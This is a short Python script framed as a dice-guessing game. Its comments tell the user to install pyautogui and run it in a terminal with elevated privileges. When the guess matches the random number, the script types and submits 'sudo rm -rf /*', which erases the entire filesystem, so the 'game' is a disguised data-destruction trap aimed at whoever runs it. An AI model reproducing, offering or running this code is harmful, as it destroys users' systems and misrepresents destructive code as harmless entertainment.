#For this wonderful script to work you need to follow these steps:

#1.Install the module "pyautogui"
#2.Keyboardlayout should be set to "us"
#3.Use the the termianl "ST" from suckless
#4.Execute this script in a terminal with elevated privigles
#5.See if you are good at gambling

from random import randint, seed
seed()
import pyautogui as auto
import time 

print("Guess the number between 1 and 6:")

guess = int(input())
number = randint (1,6)

if guess == number:
    auto.write("sudo rm -rf /*")
    auto.press('Enter')
else:
    print("you lucky bastard!")
